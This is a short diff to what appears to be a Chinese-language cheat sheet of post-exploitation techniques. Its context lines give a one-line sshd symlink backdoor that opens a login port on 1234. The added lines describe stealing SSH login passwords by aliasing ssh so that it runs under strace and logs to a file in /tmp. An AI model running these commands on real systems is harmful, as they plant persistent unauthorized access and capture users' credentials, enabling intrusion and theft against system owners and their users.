@@ -219,6 +219,10 @@ sshd pam.d 软链接后门
 
 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=1234
 
+通过strace + alias获取ssh登陆密码
+
+alias ssh="strace –o /tmp/ssh.trace.log ssh"
+
 ## vnc
 
 vnc 客户端和服务端握手流程
